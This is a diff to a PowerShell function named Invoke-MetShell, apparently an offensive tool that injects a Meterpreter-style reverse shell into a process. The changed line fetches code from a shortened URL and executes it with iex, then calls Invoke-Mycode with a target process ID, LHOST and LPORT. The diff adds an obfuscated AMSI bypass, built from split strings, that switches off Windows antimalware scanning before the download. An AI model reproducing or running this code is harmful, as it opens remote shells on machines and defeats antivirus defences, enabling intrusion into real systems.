@@ -69,7 +69,7 @@ function Invoke-MetShell
     if ($env:Processor_Architecture -ne "x86")
     { 
         write-warning 'Run command in x86 context'
-        start-job -scriptblock {iex((New-Object system.net.webclient).DownloadString('https://goo.gl/ks6EMR'));Invoke-Mycode -ProcessId $args[0] -Lhost $args[1] -Lport $args[2];} -ArgumentList @($procId, $lhost, $lport) -RunAs32
+        start-job -scriptblock {[Ref].Assembly.GetType('System.M'+'ana'+'gement.Automation.A'+'msi'+'Uti'+'ls').GetField('ams'+'iIni'+'tFa'+'iled','NonPublic,Static').SetValue($null,$true);iex((New-Object system.net.webclient).DownloadString('https://goo.gl/ks6EMR'));Invoke-Mycode -ProcessId $args[0] -Lhost $args[1] -Lport $args[2];} -ArgumentList @($procId, $lhost, $lport) -RunAs32
     }
     else
     { 
